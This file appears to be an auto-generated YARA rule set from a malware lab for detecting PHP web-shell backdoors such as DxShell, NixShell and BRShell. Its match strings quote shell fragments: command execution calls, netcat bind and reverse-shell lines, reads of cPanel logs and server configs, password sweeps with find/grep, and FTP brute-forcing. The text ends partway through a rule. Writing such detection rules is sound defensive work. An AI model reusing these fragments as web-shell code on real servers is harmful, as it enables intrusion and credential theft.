/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__loose__js
   Reference: php__loose__js php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule backdoor_php_hvashell__a4f011b7276c {
   meta:
      description = "php__loose__js - file backdoor_php_hvashell__a4f011b7276c"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "a4f011b7276cfbaf601b0882202cfc56cca0af8f7f20f962b451dc6318988c8f"
   strings:
      $s1 = "<font size=2><a href=\"<?=$PHP_SELF?>?action=cmd&method=<?=$cmd_method?>\">Exec commands by PHP</a></font>" fullword ascii /* score: '26.00'*/
      $s2 = "              $ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUME" ascii /* score: '21.00'*/
      $s3 = "<!-- read check -->" fullword ascii /* score: '20.00'*/
      $s4 = "<!-- system check -->" fullword ascii /* score: '20.00'*/
      $s5 = "<font size=2><a href=\"<?=$PHP_SELF?>?action=cmdbrowse\">Exec browse by PHP</a></font>" fullword ascii /* score: '19.00'*/
      $s6 = "<br>PHP Shell Support by <a href=\"mailto:admin@bansacviet.net\">DTN</a> " fullword ascii /* score: '18.00'*/
      $s7 = "            echo \"<!-- MYSQL ERROR:\\n\".mysql_error().\"\\n-->\";" fullword ascii /* score: '17.00'*/
      $s8 = "<!-- browse check -->" fullword ascii /* score: '17.00'*/
      $s9 = "<!-- mysql check -->" fullword ascii /* score: '17.00'*/
      $s10 = "            echo \"\\n\\n<!-- MYSQL ERROR:\\n\".mysql_error().\"\\n-->\\n\\n\";" fullword ascii /* score: '17.00'*/
      $s11 = "        if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $ss = true; $sys = true; $this->cmd_method = " ascii /* score: '16.00'*/
      $s12 = "        if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $ss = true; $sys = true; $this->cmd_method = " ascii /* score: '16.00'*/
      $s13 = "        if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $sys = true; $this->cmd_method = \"system\"; " ascii /* score: '16.00'*/
      $s14 = "        if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $sys = true; $this->cmd_method = \"system\"; " ascii /* score: '16.00'*/
      $s15 = "        if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru\"); $sys = true; $this->cmd_method = \"passthru" ascii /* score: '16.00'*/
      $s16 = "        if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru\"); $sys = true; $this->cmd_method = \"passthru" ascii /* score: '16.00'*/
      $s17 = "lse { echo \" -->\"; $this->output_state(0, \"passthru\"); }" fullword ascii /* score: '16.00'*/
      $s18 = " else { echo \" -->\"; $this->output_state(0, \"readfile\"); }" fullword ascii /* score: '16.00'*/
      $s19 = "<title>:: phpHS :: PHP HVA Shell Script ::</title>" fullword ascii /* score: '15.00'*/
      $s20 = "        $string = shell_exec(\"$cmd 2>&1\");" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule backdoor_php_safeovershell__23436f5e67a4 {
   meta:
      description = "php__loose__js - file backdoor_php_safeovershell__23436f5e67a4"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "23436f5e67a488e1a6596dbc92bc18651554c29af393da91e0c16fc7ac9d6037"
   strings:
      $x1 = "  elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii /* score: '34.00'*/
      $x2 = "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */" fullword ascii /* score: '33.00'*/
      $s3 = "*                           Safe0ver Shell //Safe Mod Bypass By Evilc0der               *" fullword ascii /* score: '30.00'*/
      $s4 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword ascii /* score: '28.00'*/
      $s5 = "                 /* <!-- Execute --> */" fullword ascii /* score: '26.00'*/
      $s6 = "                 echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii /* score: '25.00'*/
      $s7 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii /* score: '23.00'*/
      $s8 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword ascii /* score: '22.00'*/
      $s9 = "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii /* score: '22.00'*/
      $s10 = "elseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */" fullword ascii /* score: '22.00'*/
      $s11 = "//$http_auth_pass = \"phpshell\";    /* HTTP Authorisation password, uncomment if you want to use this */        " fullword ascii /* score: '22.00'*/
      $s12 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword ascii /* score: '22.00'*/
      $s13 = "elseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */" fullword ascii /* score: '22.00'*/
      $s14 = "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */" fullword ascii /* score: '22.00'*/
      $s15 = "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */" fullword ascii /* score: '22.00'*/
      $s16 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii /* score: '22.00'*/
      $s17 = "$safemodgec = shell_exec($evilc0der);" fullword ascii /* score: '22.00'*/
      $s18 = "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */" fullword ascii /* score: '22.00'*/
      $s19 = "<option value=\"cat /var/cpanel/accounting.log\">cat /var/cpanel/accounting.log</option>" fullword ascii /* score: '19.00'*/
      $s20 = "                 /* <!-- Download --> */" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_dxshell_a__4e935a43cbeb {
   meta:
      description = "php__loose__js - file backdoor_php_dxshell_a__4e935a43cbeb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "4e935a43cbeb926b923834c75cb6cce4361be86ac88db036356767207be48774"
   strings:
      $x1 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Jo" ascii /* score: '50.00'*/
      $x2 = "foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.\";\"; /* headers */" fullword ascii /* score: '32.00'*/
      $x3 = "$DxDOWNLOAD_File['content'].=\"\\n\\t\".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';" fullword ascii /* score: '31.00'*/
      $s4 = "<html><head><title><?=$_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?=$GLOB['DxMODES'][$_GET['dxmode']];?></tit" ascii /* score: '30.00'*/
      $s5 = "<html><head><title><?=$_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?=$GLOB['DxMODES'][$_GET['dxmode']];?></tit" ascii /* score: '30.00'*/
      $s6 = "print \"\\n\".'<?php'.\"\\n\".' //Execute this, and you\\'ll get the requested \"'.$DxDOWNLOAD_File['filename'].'\" in the same " ascii /* score: '30.00'*/
      $s7 = "$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';" fullword ascii /* score: '28.00'*/
      $s8 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.DxURL('kill', '').'&dxmode=F_DWN&dxparam=SRC&dxfil" ascii /* score: '28.00'*/
      $s9 = "print \"\\n\".'<?php'.\"\\n\".' //Execute this, and you\\'ll get the requested \"'.$DxDOWNLOAD_File['filename'].'\" in the same " ascii /* score: '27.00'*/
      $s10 = "print '[!] For complete portlist go to <a href=\"http://www.iana.org/assignments/port-numbers\" target=_blank>http://www.iana.or" ascii /* score: '26.00'*/
      $s11 = "((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND /* form */" fullword ascii /* score: '26.00'*/
      $s12 = "if (headers_sent()) $DXGLOBALSHIT=true; else $DXGLOBALSHIT=FALSE; /* This means if bug.php has fucked up the output and headers " ascii /* score: '26.00'*/
      $s13 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87" ascii /* score: '26.00'*/
      $s14 = "print '[!] For complete portlist go to <a href=\"http://www.iana.org/assignments/port-numbers\" target=_blank>http://www.iana.or" ascii /* score: '26.00'*/
      $s15 = "if (!isset($F['s_php'])) die('o_O Tync DDOS Remote Shell '.$GLOB['SHELL']['Ver'].\"\\n\".'<br>Use GET or POST to set \"s_php\" v" ascii /* score: '25.00'*/
      $s16 = "$DEFQUERY=DxHTTPMakeHeaders('GET', '/index.php?get=q&get2=d', 'www.microsoft.com', 'DxS Browser', 'http://referer.com/', array('" ascii /* score: '25.00'*/
      $s17 = "function DxExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */" fullword ascii /* score: '25.00'*/
      $s18 = "Message Processing Module [recv]',46=>'MPM [default send]',47=>'NI FTP',48=>'Digital Audit Daemon',49=>'TACACS, Login Host Proto" ascii /* score: '24.00'*/
      $s19 = "O Pipe, \"<b>?</b>\" Unknown<br>Others: Owner/Group/World<br>\"<b>r</b>\" Read, \"<b>w</b>\" Write, \"<b>x</b>\" Execute<br><br>" ascii /* score: '24.00'*/
      $s20 = "host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'\" style=\"width:100%;\">';" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_crystalshell_a__6d00c4705c9f {
   meta:
      description = "php__loose__js - file backdoor_php_crystalshell_a__6d00c4705c9f"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "6d00c4705c9fe7caa98cd0563063446e7feffc11a6daa455b9b6400c3ea0363c"
   strings:
      $s1 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii /* score: '26.00'*/
      $s2 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii /* score: '26.00'*/
      $s3 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value=\"1\">&nbsp;<input type=\"submit\" name=\"submi" ascii /* score: '24.00'*/
      $s4 = "print \"<center><div id=logostrip>Download - OK. (\".$sizef.\"??)</div></center>\";" fullword ascii /* score: '23.00'*/
      $s5 = "print \"<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>\";" fullword ascii /* score: '23.00'*/
      $s6 = "<font color=#DCE7EF face=\"Verdana\" size=\"-2\"><span lang=\"en-us\">&nbsp;</span></font></font></b></font><b><span lang=\"en-u" ascii /* score: '22.00'*/
      $s7 = "t face=\"verdana\" color=\"white\"><a title=\"bind shell\" href=\"?act=bindport\"><font color=#CC0000 size=\"3\">Bind</font></a>" ascii /* score: '22.00'*/
      $s8 = " <br>Bind port to  :<br> bind shell " fullword ascii /* score: '22.00'*/
      $s9 = "\"Execute\" style=\"border: 1px solid #000000\"></form></td></tr></TABLE><a bookmark=\"minipanel\" href=\"?act=bind\"><font face" ascii /* score: '21.00'*/
      $s10 = "function execute($com)" fullword ascii /* score: '21.00'*/
      $s11 = ". ini_get('safe_mode_include_dir') . \"<br>Exec here: \" . ini_get('safe_mode_exec_dir'). \"</b></font>\";}" fullword ascii /* score: '21.00'*/
      $s12 = "<table id=tb><tr><td>Execute:<INPUT type=\\\"text\\\" name=\\\"cmd\\\" size=30 value=\\\"$cmd\\\"></td></tr></table>" fullword ascii /* score: '21.00'*/
      $s13 = "echo decode(execute($cmd));" fullword ascii /* score: '21.00'*/
      $s14 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii /* score: '19.00'*/
      $s15 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii /* score: '19.00'*/
      $s16 = "echo \"<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>\";" fullword ascii /* score: '19.00'*/
      $s17 = "list file attributes on a Linux second extended file system</option><option value=\"netstat -an | grep -i listen\">" fullword ascii /* score: '18.00'*/
      $s18 = "                    <!-- DESCRIPTION -->" fullword ascii /* score: '18.00'*/
      $s19 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"][\"name\"]);" fullword ascii /* score: '18.00'*/
      $s20 = "Security Center Team</a> |<a href=\"http://www.secure4center.com\"><font color=\"#DCE7EF\">securityCenter</font></a>|" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule backdoor_php_nixshell_a__eb03f038917c {
   meta:
      description = "php__loose__js - file backdoor_php_nixshell_a__eb03f038917c"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "eb03f038917c4d4a74d894c08e5bd50c1948b7f50e20af204eaea1e3a26bdbfe"
   strings:
      $s1 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/" ascii /* score: '29.00'*/
      $s2 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/" ascii /* score: '29.00'*/
      $s3 = " login:password - \".$ftp_user_name.\":\".$ftp_user_name.\"</b><br>\";" fullword ascii /* score: '28.00'*/
      $s4 = "    if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel lo" ascii /* score: '27.00'*/
      $s5 = "exec(\"find / -name *.inc.php | xargs grep -li $password\");" fullword ascii /* score: '27.00'*/
      $s6 = "exec(\"find / -name *.inc | xargs grep -li $password\");" fullword ascii /* score: '27.00'*/
      $s7 = "exec(\"find / -name *.php | xargs grep -li $password\");" fullword ascii /* score: '27.00'*/
      $s8 = " <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $charsname.tar.gz\").\"" fullword ascii /* score: '27.00'*/
      $s9 = "    if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel lo" ascii /* score: '27.00'*/
      $s10 = "/* command execute form */" fullword ascii /* score: '26.00'*/
      $s11 = "       fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii /* score: '26.00'*/
      $s12 = "/* command execute */" fullword ascii /* score: '26.00'*/
      $s13 = "exec(\"find / -name *.inc.php | xargs grep -li localhost\");" fullword ascii /* score: '23.00'*/
      $s14 = "exec(\"find / -name *.php | xargs grep -li localhost\");" fullword ascii /* score: '23.00'*/
      $s15 = "echo $ftp_user_name.\" - error<br>\";" fullword ascii /* score: '23.00'*/
      $s16 = " $blah=exec(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii /* score: '23.00'*/
      $s17 = "exec(\"find / -name *.inc | xargs grep -li localhost\");" fullword ascii /* score: '23.00'*/
      $s18 = " $blah=exec(\"gcc -o /tmp/bd /tmp/bd.c\");" fullword ascii /* score: '23.00'*/
      $s19 = "if($file && $host && $login){" fullword ascii /* score: '23.00'*/
      $s20 = "<a href='?ac=upload&file3=$public_site/m&file2=/tmp'>Local ROOT for linux 2.6.20 - mremap (./m)</a><br>" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule backdoor_php_rodnoc__dd107741a08b {
   meta:
      description = "php__loose__js - file backdoor_php_rodnoc__dd107741a08b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "dd107741a08b09cde673e03ce7a89b2dcaa791fd6a89f7050d70a3a9bddb4c2b"
   strings:
      $x1 = " ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?p" ascii /* score: '35.00'*/
      $x2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii /* score: '31.00'*/
      $s3 = "  echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login" ascii /* score: '30.00'*/
      $s4 = "  echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login" ascii /* score: '30.00'*/
      $s5 = "  if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii /* score: '30.00'*/
      $s6 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=acco" ascii /* score: '29.00'*/
      $s7 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=acco" ascii /* score: '29.00'*/
      $s8 = "CTT Shell -=[ <? echo $HTTP_HOST; ?> ]=- </title>" fullword ascii /* score: '28.00'*/
      $s9 = "  function ctftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii /* score: '28.00'*/
      $s10 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii /* score: '27.00'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '26.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s13 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii /* score: '26.00'*/
      $s14 = "nput type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Execute\\\">&nbsp;<input type=\\\"submit\\\" value=\\\"View&Edit command" ascii /* score: '26.00'*/
      $s15 = " $out = \"# Dumped by ctShell.SQL v. \".$cv.\"" fullword ascii /* score: '26.00'*/
      $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '26.00'*/
      $s17 = "echo \"<form action=\\\"\".$sul.\"act=cmd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"\".htmls" ascii /* score: '26.00'*/
      $s18 = "  else {echo \"<form method=\\\"POST\\\"><br>Read first: <input type=\\\"text\\\" name=\\\"fqb_lenght\\\" value=\\\"\".$nixpwdpe" ascii /* score: '25.00'*/
      $s19 = "  else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii /* score: '24.00'*/
      $s20 = ":</b><form action=\"<?php echo $sul; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_ac" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_brshell__3b6142b1d794 {
   meta:
      description = "php__loose__js - file backdoor_php_brshell__3b6142b1d794"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "3b6142b1d794ff700a5214bf3977a16d2763453105026398bf5bbe407cf74ccc"
   strings:
      $x1 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii /* score: '54.00'*/
      $x2 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii /* score: '51.00'*/
      $x3 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii /* score: '47.00'*/
      $x4 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii /* score: '45.00'*/
      $x5 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii /* score: '45.00'*/
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii /* score: '44.00'*/
      $x7 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii /* score: '38.00'*/
      $x8 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii /* score: '37.00'*/
      $x9 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii /* score: '36.00'*/
      $x10 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii /* score: '36.00'*/
      $x11 = "$intro=\"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\"><tr><td bgcolor=\\\"#666666" ascii /* score: '36.00'*/
      $x12 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii /* score: '35.00'*/
      $x13 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii /* score: '34.00'*/
      $x14 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii /* score: '31.00'*/
      $x15 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr><form method=\\\"POST\\\"><tr><td width=\\\"20%" ascii /* score: '31.00'*/
      $x16 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii /* score: '31.00'*/
      $s17 = "}else echo \"<center><form method=\\\"POST\\\" name=form>${t}HTTP Auth cracker:</td><td bgcolor=\\\"#333333\\\"><select name=met" ascii /* score: '30.00'*/
      $s18 = "echo\"</textarea></td></tr><form method=post><tr><td bgcolor=\\\"#808080\\\"><input type=text size=91 name=cmd value=\\\"\";if (" ascii /* score: '29.00'*/
      $s19 = "fputs($url, \"GET $file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 (c" ascii /* score: '28.00'*/
      $s20 = "fputs($url, \"GET /$file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 (" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _backdoor_php_crystalshell_a__6d00c4705c9f_backdoor_php_rodnoc__dd107741a08b_0 {
   meta:
      description = "php__loose__js - from files backdoor_php_crystalshell_a__6d00c4705c9f, backdoor_php_rodnoc__dd107741a08b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "6d00c4705c9fe7caa98cd0563063446e7feffc11a6daa455b9b6400c3ea0363c"
      hash2 = "dd107741a08b09cde673e03ce7a89b2dcaa791fd6a89f7050d70a3a9bddb4c2b"
   strings:
      $s1 = "error_reporting(5);" fullword ascii /* score: '10.00'*/
      $s2 = "$v = @ini_get(\"open_basedir\");" fullword ascii /* score: '9.00'*/
      $s3 = "echo \"PostgreSQL: <b>\";" fullword ascii /* score: '9.00'*/
      $s4 = "@ignore_user_abort(true);" fullword ascii /* score: '7.00'*/
      $s5 = "echo \"</table><br>\";" fullword ascii /* score: '4.00'*/
      $s6 = "if($mssql_on){echo \"<font color=green>ON</font></b>\";}else{echo \"<font color=red>OFF</font></b>\";}" fullword ascii /* score: '4.00'*/
      $s7 = "echo \"cURL: \".(($curl_on)?(\"<b><font color=green>ON</font></b>\"):(\"<b><font color=red>OFF</font></b>\"));" fullword ascii /* score: '4.00'*/
      $s8 = "echo \"MSSQL: <b>\";" fullword ascii /* score: '4.00'*/
      $s9 = "else {$safemode = false; $hsafemode = \"<font color=\\\"green\\\">OFF (not secure)</font>\";}" fullword ascii /* score: '4.00'*/
      $s10 = "echo \"MySQL: <b>\";" fullword ascii /* score: '4.00'*/
      $s11 = "$pg_on = @function_exists('pg_connect');" fullword ascii /* score: '4.00'*/
      $s12 = "if($mysql_on){" fullword ascii /* score: '4.00'*/
      $s13 = "echo \"<font color=green>ON</font></b>\"; } else { echo \"<font color=red>OFF</font></b>\"; }" fullword ascii /* score: '4.00'*/
      $s14 = "if (!$free) {$free = 0;}" fullword ascii /* score: '4.00'*/
      $s15 = "else {$openbasedir = false; $hopenbasedir = \"<font color=\\\"green\\\">OFF (not secure)</font>\";}" fullword ascii /* score: '4.00'*/
      $s16 = "if($pg_on){echo \"<font color=green>ON</font></b>\";}else{echo \"<font color=red>OFF</font></b>\";}" fullword ascii /* score: '4.00'*/
      $s17 = "$used = $all-$free;" fullword ascii /* score: '4.00'*/
      $s18 = "$mssql_on = @function_exists('mssql_connect');" fullword ascii /* score: '4.00'*/
      $s19 = " $hsafemode = \"<font color=\\\"red\\\">ON (secure)</font>\";" fullword ascii /* score: '4.00'*/
      $s20 = "$mysql_on = @function_exists('mysql_connect');" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_nixshell_a__eb03f038917c_backdoor_php_rodnoc__dd107741a08b_1 {
   meta:
      description = "php__loose__js - from files backdoor_php_nixshell_a__eb03f038917c, backdoor_php_rodnoc__dd107741a08b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "eb03f038917c4d4a74d894c08e5bd50c1948b7f50e20af204eaea1e3a26bdbfe"
      hash2 = "dd107741a08b09cde673e03ce7a89b2dcaa791fd6a89f7050d70a3a9bddb4c2b"
   strings:
      $s1 = "  $ret = `ps -aux`;" fullword ascii /* score: '5.00'*/
      $s2 = "</form>\";" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "A:hover {color:blue;TEXT-DECORATION: none}" fullword ascii /* score: '4.00'*/
      $s4 = ": \".$hsafemode.\"</b><br>\";" fullword ascii /* score: '4.00'*/
      $s5 = "echo \"<br><b>" fullword ascii /* score: '4.00'*/
      $s6 = "  else" fullword ascii /* score: '3.00'*/
      $s7 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s8 = ":</b><br>\";" fullword ascii /* score: '1.00'*/
      $s9 = "  if ($pid)" fullword ascii /* score: '1.00'*/
      $s10 = ":</td>" fullword ascii /* score: '1.00'*/
      $s11 = "</b>\";" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_nixshell_a__eb03f038917c_backdoor_php_dxshell_a__4e935a43cbeb_2 {
   meta:
      description = "php__loose__js - from files backdoor_php_nixshell_a__eb03f038917c, backdoor_php_dxshell_a__4e935a43cbeb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__js php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "eb03f038917c4d4a74d894c08e5bd50c1948b7f50e20af204eaea1e3a26bdbfe"
      hash2 = "4e935a43cbeb926b923834c75cb6cce4361be86ac88db036356767207be48774"
   strings:
      $s1 = "$info .= (($perms & 0x0020) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "$info .= (($perms & 0x0080) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "$info .= (($perms & 0x0100) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "$info .= (($perms & 0x0001) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
